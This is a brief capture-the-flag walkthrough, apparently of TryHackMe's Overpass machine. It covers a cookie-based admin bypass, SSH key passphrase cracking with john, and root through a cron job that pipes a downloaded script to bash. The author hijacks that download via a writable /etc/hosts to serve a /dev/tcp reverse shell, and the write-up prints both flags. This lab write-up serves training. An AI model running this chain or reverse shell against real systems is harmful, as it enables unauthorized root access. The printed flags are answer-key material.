# user.txt
nmap found a webserver
at the `/admin` page the js was vulnerable
it checks if the variable `SessionToken` is set to something specific
set it to None with `Cookies.set("SessionToken", "")`

got a private ssh key --> saved it to `ssh_james.key`

prepared it for john with `ssh2john ssh_james.key > ssh_james.hash`

`chmod 600 ssh_james.key`

cracked the password with `john --wordlist=/usr/share/wordlists/rockyout.txt ssh_james.hash`

got the credentials `james13`  
ssh into the machine with `ssh -i ssh_james.key james@url`

<details>
<summary>flag</summary>
user.txt -- thm{65c1aaf000506e56996822c6281e6bf7}
</details>


# root.txt
got linpeas on the target through scp `scp -i ssh.key /opt/linpeas.sh james@IP:/tmp/linepeas.sh`

ran linpeas

found a cronjob (/etc/crontab) that fetches `overpass.thm/downloads/src/buildscript.sh` every minute and pipes it to bash `as root`  
`/etc/hosts` is writeable for all users

changed the overpass.thm ip in the `/etc/hosts` file to my ip

created the above file structure and placed a bash reverse shell script in the buildscript.sh -- `/bin/bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1`  
started a http file server with python on port 80 `python -m http-server 80`  
started netcat on the port from the reverse shell `nc -nlvp PORT`

waited for the cronjob to fetch the infested file from my file-server and got a root shell through netcat

<details>
<summary>flag</summary>
root.txt -- thm{7f336f8c359dbac18d54fdd64ea753bb}
</details>